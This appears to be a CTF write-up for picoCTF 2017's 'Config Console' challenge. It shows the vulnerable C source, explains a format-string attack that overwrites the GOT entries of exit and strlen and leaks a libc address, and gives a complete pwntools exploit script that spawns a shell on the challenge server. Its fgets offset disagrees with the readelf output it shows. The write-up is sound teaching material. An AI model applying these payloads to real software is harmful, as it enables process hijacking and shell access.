Title: PicoCTF 2017 Lvl3 Config Console
Date: 2018-8-8 10:02
Modified: 2018-8-8  10:02
Category: ctf
Tags: ctf, pwnable, binary exploitation, GOT
Slug: picoCTF_lvl3ConfigConsole
Authors: F3real
Summary: How to solve picoCTF Lvl3 Config Console

This is first binary exploitation challenge on level 3. Like usual we are given binary and source code, so let’s take a look:

~~~c
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>

FILE *log_file;

void append_command(char type, char *data) {
    fprintf(log_file, "%c %s\n", type, data);
}

void set_login_message(char *message) {
    if (!message) {
        printf("No message chosen\n");
        exit(1);
    }
    printf("Login message set!\n%s\n", message);

    append_command('l', message);
    exit(0);
}

void set_exit_message(char *message) {
    if (!message) {
        printf("No message chosen\n");
        exit(1);
    }
    printf("Exit message set!\n");
    printf(message);

    append_command('e', message);
    exit(0);
}

void set_prompt(char *prompt) {
    if (!prompt) {
        printf("No prompt chosen\n");
        exit(1);
    }
    if (strlen(prompt) > 10) {
        printf("Prompt too long\n");
        exit(1);
    }
    printf("Login prompt set to: %10s\n", prompt);

    append_command('p', prompt);
    exit(0);
}

void print_help() {
    printf(
        "You can:\n"
        "    login <login-message>    set the login message\n"
        "    exit <exit-message>      set the exit message\n"
        "    prompt <prompt>          set the command prompt\n"
    );
}

void loop() {
    char buf[1024];
    while (true) {
        printf("Config action: ");
        char *result = fgets(buf, 1024, stdin);
        if (!result) exit(1);
        char *type = strtok(result, " ");
        if (type == NULL) {
            continue;
        }
        char *arg = strtok(NULL, "\n");
        switch (type[0]) {
        case 'l':
            set_login_message(arg);
            break;
        case 'e':
            set_exit_message(arg);
            break;
        case 'p':
            set_prompt(arg);
            break;
        default:
            printf("Command unrecognized.\n");
            /* Fallthrough */
        case 'h':
            print_help();
            break;
        }
    }
}

int main(int argc, char **argv) {
    if (argc != 2) {
        fprintf(stderr, "Requires log file\n");
        return 1;
    }
    log_file = fopen(argv[1], "a");
    
    setbuf(stdout, NULL);
    loop();
    return 0;
}
~~~

We have format string vulnerability in `set_exit_message`. But the problem is that programs closes after executing it once, and we can’t make exploit work in single run. To work around this we can overwrite **GOT **entry of exit function. First we need to find address of exit:

~~~text
    pwndbg> break exit@plt
    Breakpoint 1 at 0x400730
    pwndbg> disassemble 0x400730

    0x400730 <exit@plt>  jmp qword ptr [rip + 0x200b22] <0x601258>
    ...

    pwndbg> x /xw 0x601258           //GOT address of exit
    0x601258 <exit@got.plt>: 0x00400736
~~~

In snippet above we set breakpoint on address of `exit@plt` and then we examine memory it points to.

If you are not familiar with how **GOT/PLT** works, basically library functions are not called directly. Instead in **.txt** section we have calls to `func@plt` which call real functions using address in **GOT**. **PLT** function addresses are fixed in **.txt** section while **GOT** entries are resolved at run-time. This enables things like dynamic loading and **ASLR**. First time function is called, **GOT** will contain only address of **PLT** resolver code which is tasked with getting real address of function and updating **GOT**. Subsequent calls will read **GOT** value and call function directly.

We also need to find address of `loop` function.

~~~text
    pwndbg> p loop
    $1 = {<text variable, no debug info>} 0x4009bd <loop>
~~~

Since address of `loop` is similar to value found in GOT entry for `exit` we don’t have to overwrite everything. It is enough to overwrite 2 lower bytes. But before we overwrite it, we need to find how to access data we put on stack. We can achieve this with `%p`(using `%x` is not good way to display memory addresses, it works on 32 bit but since it is size of unsigned int it will fail on 64 bit binaries). Using `'exit'.ljust(8) + 'A' *8 + '.%p' * 20` we get:

    AAAAAAAA.0x7f0c3ea13323.0x7f0c3ea147a0.0x7f0c3e748c00.0x7f0c3ea147a0.0x70252e70252e7025.(nil).0x7ffeb5112115.0x7ffeb5112520.0x400aa6.(nil).0x7ffeb5112110.0x7ffeb5112110.0x7ffeb5112115.0x2020200074697865.0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70

`ljust` is used to align data we put on stack won’t be split between two memory addresses. From the output, we see that our input is on 15th position. `$` enables us to read from specified position on stack, we can use this to verify if we have right position:

    'exit'.ljust(8) + 'A' *8 + '.%15$p'

Now we are going to overwrite `exit` **GOT** entry with `loop` address. To overwrite only 2 lower bytes we are going to use `%hn` specifier.

    'exit'.ljust(8) + '%{0}c|%17$hn|'.format(2493 - 6).rjust(16) + exit_got

2 lower bytes of `loop` address are `0x09bd` which is 2493 decimal, but we deduct 6 since some extra characters get printed. To fine tune exact number we just use **gdb** and check for value after we overwrite. Also we put `exit` **GOT** address on the end since it contains null byte which stops `printf`.

Now program is no longer exiting after running single command, great :D. We can use this to leak data we need to finish our exploit. First we need to get libc base address. We can do this by finding offset of some function in libc and leaking resolved address of same function during run-time, deducting offset will give us libc base address.

Let’s get address of `fgets` **GOT** entry:

~~~text
    pwndbg> info functions fgets@plt
    All functions matching regular expression "fgets@plt":
    Non-debugging symbols:
    0x00000000004006e0  fgets@plt
    pwndbg> disassemble 0x00000000004006e0
    Dump of assembler code for function fgets@plt:
       0x004006e0 <+0>: jmp    QWORD PTR [rip+0x200b4a]  # 0x601230 
       ....
    End of assembler dump.
~~~

Next we have to find offsets of `fgets` and `system` in libc.

    $readelf -s ./libc.so.6 | grep system
    1337: 0000000000041490 45 FUNC WEAK DEFAULT   12 system@@GLIBC_2.2.5
    ....
    784: 000000000006e990 424 FUNC WEAK DEFAULT   13 fgets@@GLIBC_2.2.5

We have to use same libc as one on target system since offsets can be different (or at least check them on similar system). Now we have to leak address of `fgets`:

    'exit'.ljust(8) + '|%16$s|'.rjust(8) + fgets_got

`%s` specifier will read data from given address as a string. And now we have everything we need, last step is to overwrite `strlen` (just since it's called only in `set_prompt`) with address of `system` (system offset + libc base).

Pwntools script implementing all of the steps:

~~~python
#!/usr/bin/env python
from pwn import *

#Consts:
fgets_got     = p64(0x601230)
exit_got      = p64(0x601258)
strlen_got    = p64(0x601210)
fgets_offset  = 0x69df0
system_offset = 0x41490

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}

format_string_1 = "A"*8 + ".%p" * 20            #explore stack
format_string_2 = "A"*8 + ".%15$p"              #read our input
format_string_3 ="|%16$p|".rjust(8) + exit_got  #read address we put

def overwrite_exit(r):
	#loop address 0x4009bd
	#2493 value of last 16 bits of loop address, 2499 is value we get, 6 difference, so we deduct 
	format_string_4 ="%{0}c|%17$hn|".format(2493 - 6).rjust(16) + exit_got
	#use ljust to avoid problems with stack aligment
	payload = "exit".ljust(8) + format_string_4

	r.sendline(payload)
	#gdb.attach(r)
	r.recvuntil('Config action: Exit message set!')	
	r.recvuntil('Config action:')	

def overwrite_strlen(r, system_addr):
	addr_part_1 = system_addr & 0xFFFF
	format_s1 ="%{0}c|%17$hn|".format(int(addr_part_1) - 5).rjust(16) + strlen_got
	payload = "exit".ljust(8) + format_s1
	r.sendline(payload)
	r.recvuntil('Config action:')	

	addr_part_2 = (system_addr >> 16) & 0xFFFF
	format_s2 ="%{0}c|%17$hn|".format(int(addr_part_2) - 5).rjust(16) + p64(0x601210+2)  #modify address we put
	payload = "exit".ljust(8) + format_s2
	r.sendline(payload)
	r.recvuntil('Config action:')	
	
	addr_part_3 = (system_addr >> 32) & 0xFFFF
	format_s3 ="%{0}c|%17$hn|".format(int(addr_part_3) - 5).rjust(16) + p64(0x601210+4)  #modify address we put
	payload = "exit".ljust(8) + format_s3
	r.sendline(payload)
	r.recvuntil('Config action:')	
	
	#gdb.attach(r)


def leak_address_from_got(address, r):
	format_string_5 = "|%16$s|".rjust(8) + address
	payload = "exit".ljust(8) + format_string_5
	#gdb.attach(r)
	r.sendline(payload)
	res = r.recvuntil('Config action:').split('|')[1]
	return hex(u64(res.ljust(8, '\x00')))


def explore_stack(r):
	payload = "exit".ljust(8) + format_string_1
	#gdb.attach(r)
	r.sendline(payload)
	print r.recvuntil('Config action:')


if __name__ == "__main__":
	context.arch = 'amd64'
	context.os   = 'linux'
	context.terminal = ["terminator", "-e"]

	#r = process(['./console', 'log'], env=env)
	r = remote('shell2017.picoctf.com', 11496)
	overwrite_exit(r)

	fgets_address = leak_address_from_got(fgets_got, r)
	print "fgets: ", fgets_address
	libc_base = int(fgets_address,16) - fgets_offset
	print "libc base address: ", hex(libc_base)
	system_address = libc_base + system_offset
	print "system address: ", hex(system_address)
	
	overwrite_strlen(r, system_address)

	#explore_stack(r)
 	#gdb.attach(r)
    r.interactive() #p /bin/sh
~~~

![flag]({static}/images/2018_8_8_ConfigConsole.png){: .img-fluid .centerimage}

We have overwritten `strlen` address in three 16 bit writes (64 bit systems use only 48 bits for addresses). Other thing to note is that although ASLR is not enabled on binary, system uses it which causes address of libc functions to change, so we had to leak libc base.
